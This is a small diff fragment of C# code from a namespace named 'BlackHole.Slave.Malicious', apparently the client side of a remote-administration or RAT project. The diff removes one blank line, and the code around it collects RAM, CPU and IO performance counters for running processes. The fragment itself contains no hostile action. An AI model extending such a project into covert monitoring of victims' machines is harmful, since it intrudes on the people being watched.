@@ -33,7 +33,6 @@ namespace BlackHole.Slave.Malicious
                     PerformanceCounter ramCounter = new PerformanceCounter("Process", "Working Set", theprocess.ProcessName);
                     PerformanceCounter cpuCounter = new PerformanceCounter("Process", "% Processor Time", theprocess.ProcessName);
                     PerformanceCounter rbsCounter = new PerformanceCounter("Process", "IO Data Bytes/sec", theprocess.ProcessName);
-
                     taskInfo[theprocess.ProcessName] = new List<PerformanceCounter>(new PerformanceCounter[] { ramCounter, cpuCounter, rbsCounter});
                 }
                 double ram = taskInfo[theprocess.ProcessName][0].NextValue();
